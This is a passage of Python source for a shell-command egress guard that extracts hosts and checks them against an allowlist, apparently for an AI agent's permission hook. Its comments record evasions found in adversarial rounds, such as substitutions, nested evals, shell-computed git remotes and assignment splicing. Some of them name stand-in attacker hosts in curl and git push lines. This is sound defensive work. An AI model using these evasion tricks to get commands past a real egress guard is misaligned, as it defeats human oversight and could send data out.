                return True
        elif host == entry:
            return True
    return False


_SCHEME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9+.\-]*://")


def _parse_url_host(token: str) -> str | None:
    """Resolve a URL-ish token to its authority host via urlsplit, which
    correctly strips `user@` userinfo and works whether or not a scheme is
    present (curl/wget/git/pip all accept bare `host/path` — prepending `//`
    makes urlsplit treat it as an authority instead of a relative path)."""
    token = token.strip().strip("'\"")
    if not token:
        return None
    if token.startswith("-"):
        # An option's VALUE may be the URL: `git push --repo=<url> origin
        # main` pushes to <url>, and skipping every `-` token let it be judged
        # by `origin` instead (2026-09-05 challenger, round 2).
        if "=" not in token:
            return None
        token = token.split("=", 1)[1].strip().strip("'\"")
        if not token or token.startswith("-"):
            return None
    candidate = token if _SCHEME_RE.match(token) else "//" + token
    try:
        host = urlsplit(candidate).hostname
    except ValueError:
        return None
    return host.lower() if host else None


_BARE_HOST_TOKEN_RE = re.compile(r"^[A-Za-z0-9_.-]+\.[A-Za-z]{2,}(?:[:/].*)?$")


# Tools whose positional arguments are URLs or bare hosts. A scheme-less
# token (`attacker.example/x`) only counts as a destination when one of these
# precedes it in the same shell segment — otherwise every `name.ext` token in
# the command (a filename in a heredoc, `index.lock`, `INTERVENTIONS.md`)
# read as a host and the guard blocked plain file writes (2026-08-28).
# Tokens carrying an explicit `://` still count wherever they appear.
_URL_BEARING_TOOLS = frozenset(
    {"curl", "wget", "git", "pip", "pip3", "uv", "docker", "openssl"}
)
_SCP_STYLE_TOOLS_RE = re.compile(r"\b(?:git|scp|rsync)\b")

# For tools whose OTHER subcommands are purely local, the scheme-less-host rule
# must wait for a subcommand that actually reaches the network. `git add x.py`
# set the flag on `git`, and the filename was then read as the destination host
# "x.py" — so the most ordinary line in the repository,
# `git add <file> && git commit -m ... && git push`, was hard blocked under
# bypassPermissions, the mode daemon workers run in (2026-09-02).
_NETWORK_SUBCOMMANDS = {
    "git": frozenset(
        {
            "clone",
            "push",
            "pull",
            "fetch",
            "remote",
            "ls-remote",
            "submodule",
            "archive",
        }
    ),
    "docker": frozenset({"pull", "push", "run", "build", "exec", "login", "search"}),
}

# Final labels that are file extensions, never TLDs. A scheme-less token is only
# a destination if it looks like a host; `notes.md` and `index.lock` do not.
# This is the second half of the same guard: the subcommand test above catches
# the local-subcommand case, this one catches a filename passed to a genuinely
# network-facing command (`curl -o report.md https://x` must not yield the host
# "report.md").
# NOTE: example/test/invalid/localhost are deliberately ABSENT. They are
# RFC 2606 reserved TLDs used for exactly this kind of hostname, so
# treating them as file extensions loses real detection: `curl
# attacker.example/x` stopped resolving a host. When a label is
# ambiguous, do not reject — a missed destination is worse than an
# extra prompt.
_FILE_EXTENSIONS = frozenset(
    {
        "py",
        "pyc",
        "pyi",
        "js",
        "mjs",
        "cjs",
        "ts",
        "tsx",
        "jsx",
        "rs",
        "go",
        "java",
        "rb",
        "php",
        "c",
        "h",
        "cpp",
        "hpp",
        "cs",
        "swift",
        "kt",
        "sh",
        "bash",
        "zsh",
        "fish",
        "ps1",
        "bat",
        "md",
        "rst",
        "txt",
        "log",
        "csv",
        "tsv",
        "json",
        "jsonl",
        "yaml",
        "yml",
        "toml",
        "ini",
        "cfg",
        "conf",
        "env",
        "lock",
        "sql",
        "xml",
        "html",
        "htm",
        "css",
        "scss",
        "less",
        "png",
        "jpg",
        "jpeg",
        "gif",
        "svg",
        "ico",
        "webp",
        "pdf",
        "zip",
        "tar",
        "gz",
        "bz2",
        "xz",
        "whl",
        "egg",
        "so",
        "dylib",
        "dll",
        "exe",
        "bin",
        "bak",
        "tmp",
        "old",
        "orig",
        "patch",
        "diff",
        "lockb",
        "sum",
        "mod",
        "gradle",
        "properties",
        "plist",
    }
)


def _looks_like_local_file(token: str) -> bool:
    """Whether a scheme-less token is plainly a filename rather than a host."""
    head = token.split("/", 1)[0].split(":", 1)[0]
    if "." not in head:
        return False
    return head.rsplit(".", 1)[-1].lower() in _FILE_EXTENSIONS


def _with_substitution_bodies(text: str, depth: int = 0) -> list[str]:
    """``text`` plus the body of every command/process substitution in it,
    nested ones included. A substitution inside a DOUBLE-quoted argument
    (`-d "$(curl https://evil.example)"`) runs locally, but shlex keeps the
    whole quoted argument as one multi-word token, which _extract_url_hosts
    skips as data — so its host was never extracted and `echo "$(curl
    https://evil.example)" && curl https://github.com` was allowed on
    origin/main (2026-10-17 adversarial pass). Bounded by _check_nesting."""
    _check_nesting(depth)
    texts = [text]
    _, bodies = _split_substitutions(text)
    for body in bodies:
        texts += _with_substitution_bodies(body, depth + 1)
    return texts


def _extract_url_hosts(
    command: str,
    *,
    extra: bool = False,
    raw_only: bool = False,
    collect: list[Counter] | None = None,
) -> set[str]:
    """Extract hosts from URL-bearing tokens (curl/wget/git/pip and any bare
    https?:// occurrence), tokenizing each de-obfuscated canonical form with
    shlex and parsing candidate tokens through urlsplit — see _parse_url_host
    for why that (not a regex capture) is what defeats the userinfo trick.
    Scheme-less tokens are considered only after a URL-bearing tool in the
    same segment; git's scp-style `host:path` only in segments that invoke
    git/scp/rsync.

    ``extra=False`` is origin/main's reading, except that a `NAME=<url>`
    assignment token yields nothing (it yielded the junk host "name=https").
    ``extra=True`` reads more — every substitution body, and an assignment's
    VALUE as a URL — for the EXTRA hosts of _classified_hosts, which can block
    a command but never resolve one. ``raw_only=True`` reads the command text
    as written, with no canonical form — so no assignment spliced into a
    later `$NAME` (see _classified_hosts). ``collect``, when given, receives
    one Counter of host OCCURRENCES per text read (raw command or canonical
    form), which is how _classified_hosts tells a spliced-in destination from
    a literal one naming the same host."""
    hosts: set[str] = set()
    texts: list[str] = []
    if raw_only:
        texts = [command]
    else:
        for raw_form in _canonical_forms(command):
            texts += _with_substitution_bodies(raw_form) if extra else [raw_form]
    for raw_form in texts:
        counts: Counter = Counter()
        for segment in _SEGMENT_BOUNDARY_RE.split(raw_form):
            if not segment.strip():
                continue
            tokens = _shlex_tokens(segment)
            url_tool_seen = False
            awaiting_subcommand: frozenset[str] | None = None
            option_arg_pending = False
            for tok in tokens:
                if option_arg_pending:
                    # The argument of a git global option (`-C <path>`,
                    # `-c <k>=<v>`) is never the subcommand. It still goes
                    # through the explicit-`://` check below like any token.
                    option_arg_pending = False
                elif tok in _URL_BEARING_TOOLS:
                    subcommands = _NETWORK_SUBCOMMANDS.get(tok)
                    if subcommands is None:
                        url_tool_seen = True
                    else:
                        # Wait for the subcommand before trusting scheme-less
                        # tokens: `git add` and `git status` reach no network.
                        awaiting_subcommand = subcommands
                    continue
                elif awaiting_subcommand is not None:
                    if not tok.startswith("-"):
                        if tok in awaiting_subcommand:
                            url_tool_seen = True
                        awaiting_subcommand = None
                        continue
                    # A global option before the subcommand. Ones that take
                    # a separate argument consume the next token, so `git -C
                    # /tmp/repo push evil.example/r` still reaches `push`.
                    if (
                        awaiting_subcommand is _NETWORK_SUBCOMMANDS["git"]
                        and tok in _GIT_OPTS_WITH_ARG
                    ):
                        option_arg_pending = True
                if any(ch.isspace() for ch in tok):
                    # A quoted MULTI-WORD argument is data, not a URL. Passing
                    # it whole to _parse_url_host meant a commit message that
                    # merely contained a link was parsed as one: the trailer
                    # `<noreply@example.com>` followed by a newline and the next
                    # key produced the host "example.com>claude-session", which
                    # by construction is never allowlisted, so the commit was
                    # blocked. Note the segment splitter does not treat a
                    # newline as a boundary, so the whole multi-line message
                    # arrives here as one token.
                    #
                    # This is safe in the blocking direction: a wrapped command
                    # such as `bash -c "curl https://x"` is still DETECTED as
                    # egress by is_network_egress, which keeps shell-interpreter
                    # arguments; extraction simply yields no host, and an
                    # unresolvable destination already fails closed.
                    host = None
                elif "://" in tok:
                    # `NAME=https://host/x` — an environment assignment (`=`
                    # can never occur in a URL scheme, so a token that starts
                    # with an identifier and `=` is never a URL). Parsed
                    # whole, its authority was "NAME=https": the guard blocked
                    # on the host "sync_host_url=https", which no allowlist can
                    # approve (2026-10-17). The VALUE's host is an EXTRA host:
                    # judged (`X=https://evil.example cmd` blocks), but it is
                    # not where the command connects, so it never resolves one
                    # (`X=https://github.com curl $URL` stays unresolved).
                    if _ASSIGNMENT_RE.match(tok):
                        host = _parse_url_host(tok.split("=", 1)[1]) if extra else None
                    else:
                        host = _parse_url_host(tok)
                elif (
                    url_tool_seen
                    and _BARE_HOST_TOKEN_RE.match(tok)
                    and not _looks_like_local_file(tok)
                ):
                    host = _parse_url_host(tok)
                else:
                    host = None
                if host:
                    counts[host] += 1
            if _SCP_STYLE_TOOLS_RE.search(segment):
                # Scan the STRUCTURALLY MASKED segment, which drops quoted
                # multi-word data arguments. Scanning the raw text meant a
                # commit message was searched for scp-style remotes: a
                # multi-line `git commit -m` whose trailer carried an email
                # address yielded the "host" anthropic.com>claude-session —
                # glued across the newline from the following trailer key, and
                # by construction never allowlisted, so the commit was blocked.
                # A real scp-style remote is a single unquoted token and
                # survives masking untouched.
                masked_segment = _structural_mask(segment) or ""
                for m in _GIT_SCP_STYLE_RE.finditer(masked_segment):
                    counts[m.group(1).lower()] += 1
        hosts |= set(counts)
        if collect is not None:
            collect.append(counts)
    return hosts


# A git remote NAME: a plain identifier, never a redirection or a refspec.
_REMOTE_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*$")
_GIT_REMOTE_SUBCOMMANDS = frozenset({"push", "pull", "fetch"})

# Marks a command/process substitution in a token stream. _split_substitutions
# replaces a substitution with a single space by default, which makes an
# UNQUOTED `git -C $(pwd) push origin` tokenise as `git -C push origin` — `-C`
# then swallows the subcommand. The git walkers keep this placeholder token
# instead; a repository selector holding it is one the shell computes.
_SUBST_PLACEHOLDER = "\x1f"

# The helpers below use the command-segment machinery defined further down
# (_iter_command_segments, _consume_wrapper, _norm_head, …); names resolve at
# call time, so the order of definition does not matter.


def _shell_command_strings(tokens: list[str]) -> list[str]:
    """The strings a shell interpreter at tokens[0] executes: the operand after
    a `-c` cluster / `--command` / `<<<` (same rules as _segment_invokes_fetch),
    or — with no command flag at all — every non-flag operand, fail closed."""
    strings: list[str] = []
    j = 1
    saw_command_flag = False
    while j < len(tokens):
        tok = tokens[j]
        is_c = tok in ("--command", "<<<") or (
            _SHORT_FLAG_CLUSTER_RE.fullmatch(tok) and "c" in tok
        )
        if is_c:
            k = _first_operand(tokens, j + 1)
            if k is None:
                j += 1
                continue
            saw_command_flag = True
            strings.append(tokens[k])
            j = k + 1
            continue
        j += 1
    if saw_command_flag:
        return strings
    return [t for t in tokens[1:] if not t.startswith("-")]


# How many shell strings / eval / `$(...)` levels deep the invocation walkers
# follow. Deeper nesting RAISES _AnalysisTooComplex (check_command turns it
# into a block): the walkers used to return "no fetch here" past this depth,
# so `"eval " * 9 + "curl URL"` and ten nested `$(…)` around a curl were
# allowed (2026-09-25).
_MAX_NESTING_DEPTH = 8


def _check_nesting(depth: int) -> None:
    if depth > _MAX_NESTING_DEPTH:
        raise _AnalysisTooComplex(
            f"command nests shell strings, eval or substitutions more than "
            f"{_MAX_NESTING_DEPTH} levels deep"
        )


def _git_invocations(text: str, depth: int = 0):
    """Every `git …` simple command in ``text`` — see _command_invocations."""
    yield from _command_invocations(text, _GIT_HEAD, depth)


_GIT_HEAD = frozenset({"git"})


def _command_invocations(text: str, targets: frozenset[str], depth: int = 0):
    """Yield the token list of every simple command in ``text`` whose head is
    one of ``targets`` (`git`, or the ssh family), from the head on — past leading assignments/redirections/control words, through
    wrappers (sudo, env, nohup, xargs, …), and INTO the strings a shell
    interpreter executes (`sh -c '…'`, `eval …`, `find -exec git … ;`).

    A remote NAME inside `bash -c "git push origin main"` was resolved on
    origin/main only because the old adjacency regex happened to match inside
    the quoted string; the walker resolves it by design. A non-shell
    interpreter's string (`python3 -c "os.system('git push')"`) is code the
    hook cannot parse: it is still DETECTED (the structural mask keeps
    interpreter arguments) and its destination stays unresolved."""
    if not text:
        return
    _check_nesting(depth)
    for tokens in _iter_command_segments(text, placeholder=_SUBST_PLACEHOLDER):
        i = 0
        while i < len(tokens) and (
            _REDIRECTION_RE.match(tokens[i])
            or _ASSIGNMENT_RE.match(tokens[i])
            or tokens[i] in _CONTROL_WORDS
            or tokens[i] in (";", "&", "|")
        ):
            i += 1
        # Wrappers are stripped in an UNBOUNDED loop, by index: each pass drops
        # at least the wrapper token, so it is linear and terminates. The fixed
        # eight passes it replaces stopped looking after the eighth `sudo`, so
        # a git behind the ninth was never walked.
        while i < len(tokens):
            head = _norm_head(tokens[i])
            if (
                head not in targets
                and head not in ("eval", "find", "su")
                and (head not in _SHELL_INTERPRETERS)
            ):
                if head not in _COMMAND_WRAPPERS:
                    break
                i = _wrapper_end(tokens, i + 1, head)
                continue
            rest = tokens[i:]
            if head in targets:
                yield rest
                break
            if head in _SHELL_INTERPRETERS or head == "su":
                for string in _shell_command_strings(rest):
                    yield from _command_invocations(string, targets, depth + 1)
                break
            if head == "eval":
                yield from _command_invocations(" ".join(rest[1:]), targets, depth + 1)
                break
            if head == "find":
                for j in range(1, len(rest) - 1):
                    if rest[j] in ("-exec", "-execdir") and (
                        _norm_head(rest[j + 1]) in targets
                    ):
                        end = len(rest)
                        for k in range(j + 1, len(rest)):
                            if rest[k] in (";", "+"):
                                end = k
                                break
                        yield rest[j + 1 : end]
                break


def _git_global_options(tokens: list[str]) -> tuple[int, list[tuple[str, str]]]:
    """Walk git's global options from tokens[1]. Returns (index of the
    subcommand — len(tokens) when there is none —, the repository selectors
    seen, as (option, value) pairs in order)."""
    j = 1
    selectors: list[tuple[str, str]] = []
    while j < len(tokens):
        tok = tokens[j]
        if not tok.startswith("-"):
            break
        key: str | None = None
        value = ""
        if tok in _GIT_OPTS_WITH_ARG:
            key = tok
            value = tokens[j + 1] if j + 1 < len(tokens) else ""
            j += 2
        elif tok.startswith("--") and "=" in tok:
            key, value = tok.split("=", 1)
            j += 1
        elif tok.startswith(_GIT_OPTS_ATTACHED) and len(tok) > 2:
            key, value = tok[:2], tok[2:]
            j += 1
        else:
            j += 1
            continue
        if key in _GIT_REPO_SELECTORS:
            selectors.append((key, value))
    return j, selectors


def _git_location_literal(value: str) -> str | None:
    """A `-C`/`--git-dir`/`--work-tree` value usable as-is, or None when the
    shell would compute it (a variable or a substitution)."""
    if not value or value.isspace():
        return None
    if "$" in value or "`" in value or _SUBST_PLACEHOLDER in value:
        return None
    return os.path.expanduser(value)


def _git_lookup_location(
    selectors: list[tuple[str, str]],
) -> tuple[str, ...] | None:
    """The arguments that make `git remote get-url` run in the repository the
    command names: `-C <path>` / `--git-dir=<p>` / `--work-tree=<p>` for a
    literal selector, () when the command names none.

    A selector that is a command SUBSTITUTION (`-C "$(git rev-parse
    --show-toplevel)"`, `-C "$(git worktree list | …)"`) falls back to the
    hook's cwd — the trust the guard has always placed in cwd for `git push
    origin` and `cd X && git push origin`. Any pipeline can print any path,
    so no rule separates those from a hostile one, and the daemon's own
    pushes take exactly this shape; it is a documented limit.

    A selector that is a parameter EXPANSION (`-C "$d"`, `-C "${d:-/evil}"`)
    returns None: the canonical form in which an assignment has been spliced
    names the repository literally and decides, and when no form does, the
    repository is unknown and the destination stays unresolved. `${d:-/evil}`
    fell back to cwd before (2026-09-05 challenger, round 2)."""
    location: list[str] = []
    for opt, value in selectors:
        literal = _git_location_literal(value)
        if literal is not None:
            location += ["-C", literal] if opt == "-C" else [f"{opt}={literal}"]
            continue
        rest = value.replace(_SUBST_PLACEHOLDER, "")
        if _SUBST_PLACEHOLDER in value and "$" not in rest and "`" not in rest:
            continue
        return None
    return tuple(location)


def _resolve_git_remote_url(
    remote_name: str, location: tuple[str, ...] = ()
) -> str | None:
    """Resolve a git remote NAME (e.g. 'origin') to its configured URL via
    local git metadata — read-only, no network I/O of its own. This is what
    lets a bare `git push origin main` / `git fetch` / `git pull` be judged
    by the remote's actual configured destination, instead of always being
    gated just because no URL/host literally appears on the command line.

    ``location`` is the literal `-C <path>` / `--git-dir=<p>` /
    `--work-tree=<p>` selection the command itself carried, so the lookup runs
    in the repository the push will run in. Only those options are ever
    passed through — never `-c` or `--exec-path`, which could change what
    this lookup does. A path that is not a repository, or a name that is not
    a remote there, resolves to None: unresolved, never allowed."""
    try:
        result = subprocess.run(
            ["git", *location, "remote", "get-url", remote_name],
            capture_output=True,
            text=True,
            timeout=5,
        )
    except (OSError, subprocess.TimeoutExpired):
        return None
    if result.returncode != 0:
        return None
    return result.stdout.strip() or None


def _resolve_git_remote_push_urls(
    remote_name: str, location: tuple[str, ...] = ()
) -> list[str]:
    """`git remote get-url --push --all <name>`: every URL a PUSH goes to.
    `remote.<name>.pushurl` replaces `url` for pushes, so a remote whose url
    is github.com and whose pushurl is elsewhere pushes elsewhere — verified
    against git (2026-09-05 challenger, round 2). Empty on any failure."""
    try:
        result = subprocess.run(
            ["git", *location, "remote", "get-url", "--push", "--all", remote_name],
            capture_output=True,
            text=True,
            timeout=5,
        )
    except (OSError, subprocess.TimeoutExpired):
        return []
    if result.returncode != 0:
        return []
    return [line.strip() for line in result.stdout.splitlines() if line.strip()]


def _git_remote_urls(remote_name: str, location: tuple[str, ...] = ()) -> list[str]:
    """Every URL configured for a remote NAME — the fetch URL first, then each
    push URL. Empty when the name does not resolve (unresolved, never
    allowed). The fetch lookup goes through _resolve_git_remote_url so the
    existing single-URL tests keep their seam."""
    fetch_url = (
        _resolve_git_remote_url(remote_name, location)
        if location
        else _resolve_git_remote_url(remote_name)
    )
    if not fetch_url:
        return []
    urls = [fetch_url]
    for url in _resolve_git_remote_push_urls(remote_name, location):
        if url not in urls:
            urls.append(url)
    return urls


def _git_remote_is_computed(command: str) -> bool:
    """Whether some git push/pull/fetch takes its REMOTE from the shell — the
    first operand after the subcommand holds a `$`, a backtick or a command
    substitution (`git push $R`, `git fetch "$(pick)" main`). _git_remote_hosts
    skips such a token and falls back to `origin`, so on origin/main `git push
    $R` was judged as a push to origin and ALLOWED whatever $R held (found by
    the 2026-10-17 differential run). Such a command is unresolved."""
    for form in _canonical_forms(command):
        for git in _git_invocations(form):
            j, _selectors = _git_global_options(git)
            if j >= len(git) or git[j] not in _GIT_REMOTE_SUBCOMMANDS:
                continue
            for tok in git[j + 1 :]:
                if tok.startswith("-"):
                    continue
                if "$" in tok or "`" in tok or _SUBST_PLACEHOLDER in tok:
                    return True
                break
    return False


def _git_remote_hosts(command: str) -> set[str]:
    """For git push/pull/fetch invoked with a bare remote NAME (or no name,
    defaulting to the conventional 'origin') rather than a literal URL,
    resolve the actually-configured remote and extract its host. A literal
    URL or scp-style remote on the command line is already handled by
    _extract_url_hosts/_GIT_SCP_STYLE_RE — this only covers the NAME form.

    Token-based over every canonical form (a form in which `d=/path` has
    been spliced into `git -C "$d" push` names the repository literally),
    with git's global options walked rather than assumed absent. EVERY URL
    of the remote counts: a `pushurl` that differs from `url` is where a push
    actually goes."""
    hosts: set[str] = set()
    cache: dict[tuple[str, tuple[str, ...]], list[str]] = {}
    for form in _canonical_forms(command):
        for git in _git_invocations(form):
            j, selectors = _git_global_options(git)
            if j >= len(git) or git[j] not in _GIT_REMOTE_SUBCOMMANDS:
                continue
            location = _git_lookup_location(selectors)
            if location is None:
                continue
            # Candidate remote NAMES, in order. Taking whatever came first
            # meant a shell redirection was tried as one: `git push 2>&1`
            # resolved the remote "2>", which fails, and the function then
            # gave up entirely rather than falling back — so the destination
            # was unknown and the push was hard blocked, while the identical
            # `git push origin main` was allowed. Anything unrecognisable is
            # skipped, and the first name that resolves is the remote: `git
            # fetch --depth 1 origin` tries "1", fails, and moves on to origin.
            names: list[str] = []
            literal_remote = False
            for tok in git[j + 1 :]:
                if tok.startswith("-"):
                    continue
                if "://" in tok or "@" in tok or "/" in tok:
                    # The remote itself as a URL/scp spec is handled
                    # elsewhere; after a name it is a refspec (`feat/x`).
                    literal_remote = not names
                    break
                if _REMOTE_NAME_RE.match(tok):
                    names.append(tok)
            if literal_remote:
                continue
            for name in names or ["origin"]:
                key = (name, location)
                if key not in cache:
                    cache[key] = _git_remote_urls(name, location)
                remote_urls = cache[key]
                if not remote_urls:
                    continue
                for remote_url in remote_urls:
                    host = _parse_url_host(remote_url)
                    if host:
                        hosts.add(host)
                    else:
                        for gm in _GIT_SCP_STYLE_RE.finditer(remote_url):
                            hosts.add(gm.group(1).lower())
                break
    return hosts


# Database client CLI host extraction (SCOUT-20260818-1). URI-form connect
# strings (postgresql://, mongodb://, redis://) need no dedicated regex here
# — _extract_url_hosts already parses any `scheme://` token via urlsplit
# regardless of which tool it belongs to. These cover the non-URL syntaxes:
# -h/--host (space-separated or attached, e.g. `-hhost`), sqlcmd/isql's -S
# (optionally `tcp:`-prefixed, comma/backslash-suffixed with port/instance),
# Oracle sqlplus's `user/pass@[//]host[:port]` connect string, and the
# legacy bare `mongo host:port/db` positional shorthand.
#
# _DB_HOST_FLAG_RE/_SQLCMD_HOST_RE/_ISQL_HOST_RE are deliberately NOT
# re.IGNORECASE — see _has_db_client_case_sensitive_flag's docstring above
# for why folding case on `-h`/`-S` would misparse psql's `-H` (HTML output)
# or sqlcmd/isql's `-s` (column separator/DSN) as a host flag. A tool
# invoked with unusual casing (`SQLCMD -S ...`) is still flagged by
# detection (case-insensitive there) but its host won't extract here —
# hosts empty means fail-closed/gated, never silently allowed.
_DB_HOST_FLAG_RE = re.compile(
    r"\b(?:psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?"
    r"(?:(?<![\w-])-h(?:=|\s+)?|--host(?:=|\s+))"
    r"([A-Za-z0-9][A-Za-z0-9_.-]*)"
)
_SQLCMD_HOST_RE = re.compile(
    r"\bsqlcmd\b[^;&|\n]*?(?<![\w-])-S(?:=|\s*)(?:tcp:)?"
    r"([A-Za-z0-9][A-Za-z0-9_.\\,-]*)"
)
_ISQL_HOST_RE = re.compile(
    r"\bisql\b[^;&|\n]*?(?<![\w-])-S(?:=|\s*)([A-Za-z0-9][A-Za-z0-9_.-]*)"
)
_SQLPLUS_HOST_RE = re.compile(
    r"\bsqlplus\b[^;&|\n]*?@/{0,2}([A-Za-z0-9_.-]+)",
    re.IGNORECASE,
)
_MONGO_BARE_HOSTPORT_RE = re.compile(
    r"\bmongo(?:sh)?\b\s+([A-Za-z0-9_.-]+):\d+(?:/\S*)?",
    re.IGNORECASE,
)


def _db_client_hosts(command: str) -> set[str]:
    """Extract hosts from database-client connect syntax that isn't URL
    syntax — see the constants above for the specific forms covered."""
    hosts: set[str] = set()
    for m in _DB_HOST_FLAG_RE.finditer(command):
        hosts.add(m.group(1).split(":")[0].strip("."))
    for m in _SQLCMD_HOST_RE.finditer(command):
        hosts.add(m.group(1).split(",")[0].split("\\")[0].strip("."))
    for m in _ISQL_HOST_RE.finditer(command):
        hosts.add(m.group(1).split(",")[0].strip("."))
    for m in _SQLPLUS_HOST_RE.finditer(command):
        hosts.add(m.group(1).split(":")[0].strip("."))
    for m in _MONGO_BARE_HOSTPORT_RE.finditer(command):
        hosts.add(m.group(1).strip("."))
    return hosts


def _classified_hosts(command: str) -> tuple[set[str], set[str] | None]:
    """(BASE hosts, EXTRA hosts or None).

    BASE is origin/main's extraction, unchanged except that a `NAME=<url>`
    assignment token no longer yields the junk host "name=https". EXTRA is
    everything this guard reads beyond that — assignment values, substitution
    bodies, the ssh-family token walker and its looser regex. None means an
    ssh-family destination is unreadable, or a git push/pull/fetch takes its
    remote from the shell: the command is unresolved.

    The rule (2026-10-17 challenger): a command is allowed only when BASE is
    non-empty and every host in BASE | EXTRA is allowlisted. Extra hosts can
    BLOCK; they can never RESOLVE. The first version of this fix let a new
    source resolve: an allowlisted host from `X=https://github.com`, `ssh
    github.com;` or a `fly ssh` prefix made `curl $URL`, `nc $H`, `git push
    $R` … elsewhere in the same command look resolved — every one blocked on
    origin/main. With this split the branch can only be stricter than main,
    apart from the assignment junk it no longer invents."""
    if _has_connection_override(command):
        return set(), set()

    base: set[str] = set()
    per_form: list[Counter] = []
    spliced = _extract_url_hosts(command, collect=per_form)
    # An ASSIGNED value never resolves a destination (2026-10-17 challenger
    # round 3). The canonical forms splice `U=https://github.com` into a later
    # `curl $U`, so origin/main's reading of those forms found github.com and
    # the branch allowed `U=https://<allowlisted> cmd $U`, however U was
    # reassigned in between or scoped to one command. When some canonical form
    # holds MORE occurrences of an assigned host than the command as written
    # does, an assignment supplied a destination, and the whole command is
    # UNRESOLVED (blocked outside /gate) — even beside a literal allowlisted
    # URL: `U=https://github.com; curl $U https://github.com` holds github.com
    # twice spliced and once as written. Counted per occurrence, not per host,
    # for exactly that case.
    only_via_assignment = False
    assigned = _assigned_hosts(command)
    if assigned and spliced:
        literal: list[Counter] = []
        _extract_url_hosts(command, raw_only=True, collect=literal)
        written = literal[0] if literal else Counter()
        only_via_assignment = any(
            form[host] > written[host] for form in per_form for host in assigned
        )
    # Simple or explicit, else block: a command carrying a `NAME=<scheme>://…`
    # assignment — every one of which origin/main blocked, on the junk host
    # "name=https" — is judged only if nothing else in it is computed by the
    # shell. With any `$` or backtick outside the assignment values, the
    # assignment may be what a destination expands to (`U=…; U=$V; curl $U
    # https://github.com` splices to `curl $V …`), so it stays unresolved.
    if not only_via_assignment and _url_assignment_with_expansion(command):
        only_via_assignment = True
    base |= spliced
    base |= _git_remote_hosts(command)
    base |= _db_client_hosts(command)
    for pattern in HOST_EXTRACTION_PATTERNS:
        for m in re.finditer(pattern, command, re.IGNORECASE):
            host = m.group(1)
            if not host:
                continue
            host = host.split(":")[0].strip(".")
            if host:
                base.add(host)

    ssh_hosts = _ssh_family_hosts(command)
    if (
        ssh_hosts is None
        or _git_remote_is_computed(command)
        # A destination only an assignment supplies is computed by the shell:
        # unresolved, even next to a literal allowlisted URL
        # (`U=https://github.com; curl $U https://github.com`).
        or only_via_assignment
    ):
        return base, None
    return base, _extract_url_hosts(command, extra=True) | ssh_hosts


# `NAME=value` wherever it stands — a plain assignment, after export /
# declare / local / readonly, or scoped to one command. The look-behind makes a
# match start only at the beginning of an identifier (so a long identifier is
# scanned once, not once per character: linear) and never inside an option
# (`--url=…` is a literal the URL reading already sees).
_ASSIGNED_VALUE_RE = re.compile(r"(?<![\w$-])[A-Za-z_][A-Za-z0-9_]*=([^\s;&|<>()]+)")


def _url_assignment_with_expansion(command: str) -> bool:
    """Whether the command assigns a `scheme://` URL to a name AND, outside
    the assignment words, expands anything (`$`, a backtick)."""
    has_url_assignment = False
    for m in _ASSIGNED_VALUE_RE.finditer(command):
        if "://" in m.group(1):
            has_url_assignment = True
            break
    if not has_url_assignment:
        return False
    rest = _ASSIGNED_VALUE_RE.sub(" ", command)
    return "$" in rest or "`" in rest


def _assigned_hosts(command: str) -> set[str]:
    """Every host an assignment VALUE in the command could name — read from
    the command as written and from each canonical form (so a value built by
    splicing counts too). Used only to keep such hosts from RESOLVING a
    command; over-collecting can only make the guard stricter."""
    hosts: set[str] = set()
    for text in (command, *_canonical_forms(command)):
        for m in _ASSIGNED_VALUE_RE.finditer(text):
            value = m.group(1).strip("'\"")
            if not value:
                continue
            host = _parse_url_host(value)
            if host:
                hosts.add(host)
            for gm in _GIT_SCP_STYLE_RE.finditer(" " + value):
                hosts.add(gm.group(1).lower())
    return hosts


def extract_hosts(command: str) -> set[str]:
    """Extract every destination host referenced by a network-egress command.
    Strips port suffixes. Returns an empty set if none could be extracted, a
    connection-override flag was seen, or an ssh-family destination is
    unreadable — callers must treat that as an UNKNOWN destination, not an
    allowed one. check_command judges BASE and EXTRA hosts separately; see
    _classified_hosts."""
    base, extra = _classified_hosts(command)
    if extra is None:
        return set()
    return base | extra


# The bare fetch-verb pattern. It matches the word anywhere, so on its own it
# cannot tell an INVOCATION (`curl https://x`) from DATA (`grep curl file`); the
# invocation scanner below (_fetch_verb_invoked) decides that. Kept in the list
# so is_network_egress can special-case it.
_BARE_FETCH_PATTERN = r"\b(curl|wget)\b"
_FETCH_VERBS = frozenset({"curl", "wget"})

# =============================================================================
# curl/wget INVOCATION detection
# -----------------------------------------------------------------------------
# `\b(curl|wget)\b` matches the word anywhere, so a command that merely NAMES a
# fetch verb (`grep -rn curl file`, `echo curl`) was classified as egress and —
# failing closed under bypassPermissions, the mode daemon workers run in — hard
# blocked with no way past it. The narrowing: block only when curl/wget is
# actually INVOKED, i.e. is the head of a command in some execution context.
#
# An invocation is the head token of a command after any number of wrappers
# (env / sudo / time / nohup / nice / timeout / xargs / caffeinate / flock / …),
# inside a `$(...)` or backtick command substitution, a `<(...)` process
# substitution, a subshell `(...)`, a `{ ...; }` group, after a shell control
# word (if/then/for/while/…), the argument STRING of `sh -c` / `bash -c` /
# `su -c` / `eval` (recursed into, not skipped), or the command of `find -exec`.
# A verb that appears only as an argument to grep / rg / echo / cat / sed / awk /
# printf / git commit -m is DATA and is not an invocation.
# =============================================================================
_SHELL_INTERPRETERS = {"sh", "bash", "zsh", "ksh", "dash", "ash"}
_REDIRECTION_RE = re.compile(r"^\d*[<>]")
_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
# A single-dash cluster of short flags (`-lc`, `-ec`, `-xc`, `-euc`, `-c`). A
# shell parses every letter in the cluster, so `c` anywhere in it means the
# next token is the command STRING.
_SHORT_FLAG_CLUSTER_RE = re.compile(r"-[A-Za-z]+")
# A `(` glued to one of these is a function/method CALL, not a subshell — bash
# only opens a subshell with `(` in command position.
_WORD_CHAR_RE = re.compile(r"\w")
_DURATION_RE = re.compile(r"^\d+(?:\.\d+)?[smhd]?$")
# Shell control words that can precede a command at the head of a segment.
_CONTROL_WORDS = {
    "if",
    "then",
    "elif",
    "else",
    "fi",
    "do",
    "done",
    "while",
    "until",
    "for",
    "case",
    "esac",
    "function",
    "!",
    "time",
    "{",
    "}",
    "[[",
    "]]",
    "[",
    "]",
}
# Wrapper -> the option flags that CONSUME the following token as their argument
